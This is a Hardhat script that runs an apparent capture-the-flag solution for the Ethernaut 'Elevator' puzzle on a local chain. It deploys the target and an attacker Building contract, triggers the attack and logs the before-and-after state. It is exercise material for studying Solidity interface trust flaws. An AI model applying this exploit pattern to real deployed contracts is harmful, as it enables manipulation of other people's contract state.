/*
This elevator won't let you reach the top of your building. Right?

Things that might help:
Sometimes solidity is not good at keeping promises.
This Elevator expects to be used from a Building.
*/

const hre = require("hardhat");

async function main() {
  // Recreating the attack on ganache
  [macias, deployer] = await ethers.getSigners();

  // Deploying the Elevator contract
  const Elevator = await hre.ethers.getContractFactory("Elevator");
  this.elevator = await Elevator.connect(deployer).deploy();
  await this.elevator.deployed();

  // Deploying the Building contract
  const Building = await hre.ethers.getContractFactory("BuildingContract");
  this.building = await Building.connect(macias).deploy(this.elevator.address);
  await this.building.deployed();

  console.log(
    `
    Is Elevator at the top? ${await this.elevator.top()} \n
    Elevator is at floor: # ${await this.elevator.floor()}
    `
  );

  console.log("\n\n Performing attack ... \n");

  // Taking the elevator to the top
  console.log("Taking the elevator to the top ...");

  let floor = 10;
  const tx = await this.building.connect(macias).toTheMoon(floor);
  
  // Await for the tx to be mined
  console.log("Waiting while the elevator reaches the moon : )");
  let txResult = await tx.wait();

  //console.log("transaction " , txResult);

  console.log("\n===============================================\n===============================================\n");
  console.log("\n\n Results after performing the attack \n");

  console.log(
    `
    Is Elevator at the top? ${await this.elevator.top()} \n
    Elevator is at floor: # ${await this.elevator.floor()} \n
    `
  );

  console.log("\n\n ========================== Attack Completed!!!! ==========================");

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});